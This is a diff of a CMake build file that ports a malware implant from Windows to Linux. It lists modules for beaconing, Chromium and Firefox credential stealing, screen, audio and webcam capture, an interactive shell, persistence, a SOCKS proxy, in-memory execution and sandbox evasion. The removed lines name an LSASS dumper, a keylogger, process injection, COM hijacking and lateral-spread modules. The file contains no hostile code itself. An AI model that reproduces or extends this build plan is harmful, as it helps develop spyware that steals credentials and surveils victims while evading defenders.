@@ -1,28 +1,22 @@
 cmake_minimum_required(VERSION 3.20)
-project(windows-implant LANGUAGES C CXX)
-
-if(POLICY CMP0135)
-  cmake_policy(SET CMP0135 NEW)
-endif()
+project(linux-implant LANGUAGES C CXX)
 
 set(CMAKE_CXX_STANDARD 20)
 set(CMAKE_CXX_STANDARD_REQUIRED ON)
 set(CMAKE_CXX_EXTENSIONS OFF)
 
+# Add definitions
 add_definitions(-DSQLITE_OMIT_FTS5)
+add_definitions(-DLINUX)
 
-include(cmake/CompileOptions.cmake)
-include(FetchContent)
+# Find dependencies
+find_package(OpenSSL REQUIRED)
+find_package(PkgConfig REQUIRED)
 
-if(MSVC)
-    enable_language(ASM_MASM)
-    set(SYSCALL_STUB src/evasion/SyscallStub_masm.asm)
-else()
-    enable_language(ASM)
-    set(SYSCALL_STUB src/evasion/SyscallStub_gas.s)
-endif()
+pkg_check_modules(X11 REQUIRED x11)
 
 # nlohmann-json
+include(FetchContent)
 FetchContent_Declare(
     json
     URL https://github.com/nlohmann/json/releases/download/v3.11.2/json.tar.xz
@@ -36,11 +30,10 @@ FetchContent_Declare(
   URL https://github.com/google/googletest/archive/refs/heads/main.zip
   DOWNLOAD_EXTRACT_TIMESTAMP TRUE
 )
-# For Windows: Prevent overriding the parent project's compiler/linker settings
-set(gtest_force_shared_crt ON CACHE BOOL "" FORCE)
 FetchContent_MakeAvailable(googletest)
 
-add_executable(main WIN32
+# Executable
+add_executable(implant
     src/main.cpp
     src/utils/Logger.cpp
     src/utils/Shared.cpp
@@ -48,48 +41,48 @@ add_executable(main WIN32
     src/core/ImplantId.cpp
     src/crypto/AesGcm.cpp
     src/crypto/Base64.cpp
-    src/http/WinHttpClient.cpp
+    src/http/HttpClient.cpp
     src/http/RedirectorResolver.cpp
     src/beacon/Beacon.cpp
     src/beacon/TaskDispatcher.cpp
-    src/recon/WmiHelpers.cpp
     src/recon/SysInfo.cpp
     src/recon/InstalledSoftware.cpp
     src/persistence/Persistence.cpp
-    src/wifi/WifiDumper.cpp
     src/utils/Exec.cpp
     src/credential/ChromiumStealer.cpp
     src/credential/FirefoxStealer.cpp
     src/capture/Screenshot.cpp
-    src/capture/Keylogger.cpp
     src/capture/Audio.cpp
     src/capture/Webcam.cpp
     src/streaming/Streamer.cpp
     src/shell/InteractiveShell.cpp
     src/fs/FileSystem.cpp
     src/recon/DeepRecon.cpp
-    src/evasion/Syscalls.cpp
-    ${SYSCALL_STUB}
-    src/evasion/Unhooker.cpp
-    src/evasion/Injector.cpp
     src/evasion/AntiSandbox.cpp
     src/evasion/Detection.cpp
     src/evasion/JunkLogic.cpp
-    src/evasion/Bloat.cpp
-    src/execution/DotNetExecutor.cpp
+    src/execution/InMemory.cpp
     src/network/SocksProxy.cpp
-    src/persistence/ComHijacker.cpp
-    src/credential/LsassDumper.cpp
-    src/lateral/WmiExec.cpp
-    src/lateral/WirelessSpread.cpp
-    src/decoy/BSOD.cpp
+    src/wifi/WifiScanner.cpp
     external/sqlite3/sqlite3.c
 )
 
-target_include_directories(main PUBLIC src external external/sqlite3)
-target_link_libraries(main 
+target_include_directories(implant PUBLIC
+    src
+    external
+    external/sqlite3
+    ${OPENSSL_INCLUDE_DIR}
+    ${X11_INCLUDE_DIRS}
+)
+
+target_link_libraries(implant
     nlohmann_json::nlohmann_json
-    bcrypt winhttp advapi32 ole32 wbemuuid crypt32 shlwapi gdiplus vfw32 winmm user32 iphlpapi ws2_32 dbghelp wlanapi netapi32 bthprops psapi
+    OpenSSL::SSL
+    OpenSSL::Crypto
+    ${X11_LIBRARIES}
+    pthread
+    dl
+    util
 )
 
 # Tests
@@ -100,4 +93,4 @@ add_executable(unit_tests
     src/crypto/AesGcm.cpp
 )
 target_include_directories(unit_tests PRIVATE src)
-target_link_libraries(unit_tests GTest::gtest_main bcrypt crypt32)
+target_link_libraries(unit_tests GTest::gtest_main OpenSSL::Crypto pthread)
